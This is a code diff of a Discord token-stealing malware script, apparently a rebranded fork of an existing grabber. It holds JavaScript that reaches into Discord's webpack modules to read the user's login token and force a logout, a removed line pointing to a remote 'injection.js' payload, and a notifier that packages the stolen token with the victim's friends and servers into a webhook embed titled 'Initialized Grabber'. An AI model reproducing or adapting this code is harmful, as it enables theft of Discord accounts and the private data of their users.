@@ -20,7 +20,6 @@ let [
         `const elements = document.querySelectorAll('span[class^="code_"]');let p = [];elements.forEach((element, index) => {const code = element.textContent;p.push(code);});p;`,
         'window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();',
         "for (let a in window.webpackJsonp ? (gg = window.webpackJsonp.push([[], { get_require: (a, b, c) => a.exports = c }, [['get_require']]]), delete gg.m.get_require, delete gg.c.get_require) : window.webpackChunkdiscord_app && window.webpackChunkdiscord_app.push([[Math.random()], {}, a => { gg = a }]), gg.c) if (gg.c.hasOwnProperty(a)) { let b = gg.c[a].exports; if (b && b.__esModule && b.default) for (let a in b.default) 'getToken' == a && (token = b.default.getToken())} token;",
-        "https://raw.githubusercontent.com/k4itrun/discord-injection/main/injection.js",
         {
             _nitro: [
                 "<:_:1087043238654906472> ",
@@ -146,8 +145,8 @@ const notify = async (ctx, token, acc) => {
         friends = await getFriends(token),
         servers = await getServers(token);
 
-    ctx.username = "@AuraThemes - Injection";
-    ctx.avatar_url = "https://i.imgur.com/WkKXZSl.gif";
+    ctx.username = "PRI-Injection";
+    ctx.avatar_url = "https://cdn.7tv.app/emote/6444279d4f97c797e8427ce5/1x.webp";
     ctx.embeds[0].title = `Initialized Grabber - ${ctx.title}`;
     ctx.embeds[0].fields.unshift({
         name: `<a:aura:1087044506542674091> Token:`,
@@ -185,10 +184,6 @@ const notify = async (ctx, token, acc) => {
         e.author = {
             name: `${acc.username} | ${acc.id}`,
             icon_url: `https://cdn.discordapp.com/avatars/${acc.id}/${acc.avatar}.png`,
-        };
-        e.footer = {
-            text: decodeB64('QXVyYVRoZW1lcyBHcmFiYmVyIC0gaHR0cHM6Ly9naXRodWIuY29tL2s0aXRydW4vRGlzY29yZFRva2VuR3JhYmJlcg'),
-            icon_url: "https://i.imgur.com/yVnOSeS.gif",
         };
     });
 
